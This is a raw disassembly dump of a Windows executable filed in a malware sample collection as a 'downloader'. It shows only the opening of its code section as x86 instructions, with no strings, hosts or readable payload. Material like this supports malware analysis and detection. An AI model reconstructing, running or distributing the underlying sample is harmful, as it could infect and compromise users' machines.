
malware_samples/downloader/6fe1c83ad9f915cf4c82895f8f795a45f71c4513924edb83bf4d8b2ef53f7698.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 48 47 42 00    	mov    0x424748,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 64 82 40 00    	call   *0x408264
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 54 47 42 00    	mov    0x424754,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 5c 82 40 00    	call   *0x40825c
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 6c 82 40 00    	call   *0x40826c
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 60 80 40 00    	mov    0x408060,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 5c 80 40 00    	call   *0x40805c
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 b8 81 40 00    	call   *0x4081b8
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 58 80 40 00    	call   *0x408058
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 4c 80 40 00    	call   *0x40804c
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 68 80 40 00    	mov    0x408068,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 40 3f 42 00       	push   $0x423f40
  401155:	57                   	push   %edi
  401156:	ff 15 68 82 40 00    	call   *0x408268
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 88 47 42 00       	mov    0x424788,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 8c 47 42 00    	cmp    0x42478c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 8c 47 42 00    	cmp    0x42478c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 88 47 42 00    	mov    0x424788,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 8c 47 42 00    	cmp    0x42478c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 8c 47 42 00    	cmp    0x42478c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 88 47 42 00       	mov    0x424788,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 8c 47 42 00    	cmp    %esi,0x42478c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 8c 47 42 00    	cmp    0x42478c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 54 47 42 00       	mov    0x424754,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 8c 47 42 00    	mov    0x42478c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 88 47 42 00    	mov    0x424788,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 50 42 00       	mov    $0x425000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 19 4e 00 00       	call   0x40619f
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 90 47 42 00    	mov    0x424790,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 2c 3f 42 00    	add    %eax,0x423f2c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 14 3f 42 00    	push   0x423f14
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 2c 3f 42 00    	push   0x423f2c
  4013e4:	ff 15 64 81 40 00    	call   *0x408164
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 60 82 40 00    	call   *0x408260
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 54 47 42 00    	mov    0x424754,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 20 a8 40 00       	push   $0x40a820
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 1e 3f 00 00       	call   0x40534f
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec d0 01 00 00    	sub    $0x1d0,%esp
  40143d:	a1 48 47 42 00       	mov    0x424748,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  40144e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401458:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 50 42 00       	mov    $0x425000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401474:	89 0d 5c b8 40 00    	mov    %ecx,0x40b85c
  40147a:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 d1 15 00 00    	ja     0x402a5a
  401489:	ff 24 8d 6c 2a 40 00 	jmp    *0x402a6c(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 b8 3e 00 00       	call   0x40534f
  401497:	e9 eb 0e 00 00       	jmp    0x402387
  40149c:	ff 05 0c 3f 42 00    	incl   0x423f0c
  4014a2:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a5:	0f 84 dc 0e 00 00    	je     0x402387
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 28 82 40 00    	call   *0x408228
  4014b2:	e9 d0 0e 00 00       	jmp    0x402387
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 9b 15 00 00       	jmp    0x402a65
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 7e 3e 00 00       	call   0x40534f
  4014d1:	e9 84 15 00 00       	jmp    0x402a5a
  4014d6:	53                   	push   %ebx
  4014d7:	e8 d0 16 00 00       	call   0x402bac
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	59                   	pop    %ecx
  4014e0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4014e3:	7f 03                	jg     0x4014e8
  4014e5:	33 c0                	xor    %eax,%eax
  4014e7:	40                   	inc    %eax
  4014e8:	50                   	push   %eax
  4014e9:	ff 15 ec 80 40 00    	call   *0x4080ec
  4014ef:	e9 66 15 00 00       	jmp    0x402a5a
  4014f4:	ff 75 f8             	push   -0x8(%ebp)
  4014f7:	ff 15 20 82 40 00    	call   *0x408220
  4014fd:	e9 58 15 00 00       	jmp    0x402a5a
  401502:	c1 e0 02             	shl    $0x2,%eax
  401505:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401508:	75 26                	jne    0x401530
  40150a:	8b 88 e0 47 42 00    	mov    0x4247e0(%eax),%ecx
  401510:	6a 01                	push   $0x1
  401512:	89 88 20 48 42 00    	mov    %ecx,0x424820(%eax)
  401518:	e8 8f 16 00 00       	call   0x402bac
  40151d:	59                   	pop    %ecx
  40151e:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401521:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401524:	89 04 8d e0 47 42 00 	mov    %eax,0x4247e0(,%ecx,4)
  40152b:	e9 2a 15 00 00       	jmp    0x402a5a
  401530:	8b 88 20 48 42 00    	mov    0x424820(%eax),%ecx
  401536:	89 88 e0 47 42 00    	mov    %ecx,0x4247e0(%eax)
  40153c:	e9 19 15 00 00       	jmp    0x402a5a
  401541:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401544:	8d 34 85 e0 47 42 00 	lea    0x4247e0(,%eax,4),%esi
  40154b:	33 c0                	xor    %eax,%eax
  40154d:	8b 0e                	mov    (%esi),%ecx
  40154f:	3b cb                	cmp    %ebx,%ecx
  401551:	0f 94 c0             	sete   %al
  401554:	23 4d e4             	and    -0x1c(%ebp),%ecx
  401557:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax
  40155b:	89 0e                	mov    %ecx,(%esi)
  40155d:	e9 03 15 00 00       	jmp    0x402a65
  401562:	ff 34 95 e0 47 42 00 	push   0x4247e0(,%edx,4)
  401569:	56                   	push   %esi
  40156a:	e9 36 14 00 00       	jmp    0x4029a5
  40156f:	8b 0d 10 3f 42 00    	mov    0x423f10,%ecx
  401575:	8b 35 30 82 40 00    	mov    0x408230,%esi
  40157b:	3b cb                	cmp    %ebx,%ecx
  40157d:	74 07                	je     0x401586
  40157f:	52                   	push   %edx
  401580:	51                   	push   %ecx
  401581:	ff d6                	call   *%esi
  401583:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401586:	8b 0d 24 3f 42 00    	mov    0x423f24,%ecx
  40158c:	3b cb                	cmp    %ebx,%ecx
  40158e:	0f 84 c6 14 00 00    	je     0x402a5a
  401594:	50                   	push   %eax
  401595:	51                   	push   %ecx
  401596:	ff d6                	call   *%esi
  401598:	e9 bd 14 00 00       	jmp    0x402a5a
  40159d:	6a f0                	push   $0xfffffff0
  40159f:	e8 2a 16 00 00       	call   0x402bce
  4015a4:	ff 75 dc             	push   -0x24(%ebp)
  4015a7:	50                   	push   %eax
  4015a8:	ff 15 fc 80 40 00    	call   *0x4080fc
  4015ae:	85 c0                	test   %eax,%eax
  4015b0:	0f 85 a4 14 00 00    	jne    0x402a5a
  4015b6:	e9 04 12 00 00       	jmp    0x4027bf
  4015bb:	6a f0                	push   $0xfffffff0
  4015bd:	e8 0c 16 00 00       	call   0x402bce
  4015c2:	8b f8                	mov    %eax,%edi
  4015c4:	57                   	push   %edi
  4015c5:	e8 8f 46 00 00       	call   0x405c59
  4015ca:	8b f0                	mov    %eax,%esi
  4015cc:	3b f3                	cmp    %ebx,%esi
  4015ce:	74 54                	je     0x401624
  4015d0:	6a 5c                	push   $0x5c
  4015d2:	56                   	push   %esi
  4015d3:	e8 13 46 00 00       	call   0x405beb
  4015d8:	8b f0                	mov    %eax,%esi
  4015da:	8a 06                	mov    (%esi),%al
  4015dc:	88 1e                	mov    %bl,(%esi)
  4015de:	3a c3                	cmp    %bl,%al
  4015e0:	88 45 0b             	mov    %al,0xb(%ebp)
  4015e3:	75 16                	jne    0x4015fb
  4015e5:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4015e8:	74 11                	je     0x4015fb
  4015ea:	e8 c0 42 00 00       	call   0x4058af
  4015ef:	85 c0                	test   %eax,%eax
  4015f1:	74 08                	je     0x4015fb
  4015f3:	57                   	push   %edi
  4015f4:	e8 1c 42 00 00       	call   0x405815
  4015f9:	eb 06                	jmp    0x401601
  4015fb:	57                   	push   %edi
  4015fc:	e8 91 42 00 00       	call   0x405892
  401601:	3b c3                	cmp    %ebx,%eax
  401603:	74 15                	je     0x40161a
  401605:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40160a:	75 0b                	jne    0x401617
  40160c:	57                   	push   %edi
  40160d:	ff 15 f4 80 40 00    	call   *0x4080f4
  401613:	a8 10                	test   $0x10,%al
  401615:	75 03                	jne    0x40161a
  401617:	ff 45 fc             	incl   -0x4(%ebp)
  40161a:	8a 45 0b             	mov    0xb(%ebp),%al
  40161d:	88 06                	mov    %al,(%esi)
  40161f:	46                   	inc    %esi
  401620:	3a c3                	cmp    %bl,%al
  401622:	75 ac                	jne    0x4015d0
  401624:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401627:	74 29                	je     0x401652
  401629:	6a e6                	push   $0xffffffe6
  40162b:	e8 f3 fd ff ff       	call   0x401423
  401630:	57                   	push   %edi
  401631:	68 00 a8 42 00       	push   $0x42a800
  401636:	e8 ed 4b 00 00       	call   0x406228
  40163b:	57                   	push   %edi
  40163c:	ff 15 f8 80 40 00    	call   *0x4080f8
  401642:	85 c0                	test   %eax,%eax
  401644:	0f 85 10 14 00 00    	jne    0x402a5a
  40164a:	ff 45 fc             	incl   -0x4(%ebp)
  40164d:	e9 08 14 00 00       	jmp    0x402a5a
  401652:	6a f5                	push   $0xfffffff5
  401654:	e9 84 0c 00 00       	jmp    0x4022dd
  401659:	53                   	push   %ebx
  40165a:	e8 6f 15 00 00       	call   0x402bce
  40165f:	50                   	push   %eax
  401660:	e8 37 4f 00 00       	call   0x40659c
  401665:	e9 a5 06 00 00       	jmp    0x401d0f
  40166a:	6a d0                	push   $0xffffffd0
  40166c:	e8 5d 15 00 00       	call   0x402bce
  401671:	6a df                	push   $0xffffffdf
  401673:	8b f0                	mov    %eax,%esi
  401675:	e8 54 15 00 00       	call   0x402bce
  40167a:	6a 13                	push   $0x13
  40167c:	8b f8                	mov    %eax,%edi
  40167e:	e8 4b 15 00 00       	call   0x402bce
  401683:	57                   	push   %edi
  401684:	56                   	push   %esi
  401685:	ff 15 08 81 40 00    	call   *0x408108
  40168b:	85 c0                	test   %eax,%eax
  40168d:	74 07                	je     0x401696
  40168f:	6a e3                	push   $0xffffffe3
  401691:	e9 47 0c 00 00       	jmp    0x4022dd
  401696:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401699:	0f 84 20 11 00 00    	je     0x4027bf
  40169f:	56                   	push   %esi
  4016a0:	e8 f7 4e 00 00       	call   0x40659c
  4016a5:	85 c0                	test   %eax,%eax
  4016a7:	0f 84 12 11 00 00    	je     0x4027bf
  4016ad:	57                   	push   %edi
  4016ae:	56                   	push   %esi
  4016af:	e8 53 49 00 00       	call   0x406007
  4016b4:	6a e4                	push   $0xffffffe4
  4016b6:	e9 22 0c 00 00       	jmp    0x4022dd
  4016bb:	53                   	push   %ebx
  4016bc:	e8 0d 15 00 00       	call   0x402bce
  4016c1:	8b f0                	mov    %eax,%esi
  4016c3:	8d 45 08             	lea    0x8(%ebp),%eax
  4016c6:	50                   	push   %eax
  4016c7:	57                   	push   %edi
  4016c8:	68 00 04 00 00       	push   $0x400
  4016cd:	56                   	push   %esi
  4016ce:	ff 15 00 81 40 00    	call   *0x408100
